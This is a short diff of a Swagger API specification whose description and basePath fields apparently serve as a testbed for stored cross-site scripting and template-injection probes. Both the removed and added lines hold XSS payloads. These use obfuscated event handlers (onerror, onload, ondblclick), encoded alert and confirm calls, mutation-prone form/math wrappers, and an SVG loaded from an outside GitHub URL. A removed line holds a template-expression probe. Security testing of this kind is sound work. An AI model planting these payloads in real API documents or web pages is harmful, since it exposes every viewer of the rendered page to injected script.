@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math>'>"<svg src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg"><h1 onclick="al%65rt(1)">BU0</h1></math></form><img/src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg" onError="confirm`1`">
+  description: <form><math>'>"<h1 ondblclick=confirm(1);>BU0</h1></math></form><svg src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg"/onload"" ondblclick=confirm(1);></svg>
 
   version: production
-basePath: /test-c4sper0 <%= 7*3 %>
+basePath: /test-c4sper0
 security:
   - basicAuth: []
 paths:
@@ -12,7 +12,7 @@ paths:
     get:
       responses:
         '200':
-          description: <form><math>"></a></span><img%20src=x%20oNLy=1%20oNErrOR=alert(%27Test%20Stored%20XSS%27)>%27><svg/x-/onload=confirm(%27B00M-C4SPER0%27)><img%20SRC="x.png"%20oNLy=1%20oNErrOR=alert(%27rrrrrrrrrrrrrrrrrrrrrrrrrr%27)></img>
+          description: Test Image <img src=x ondblclick=confirm(1);>
       tags:
         - accounts
       operationId: findAccounts
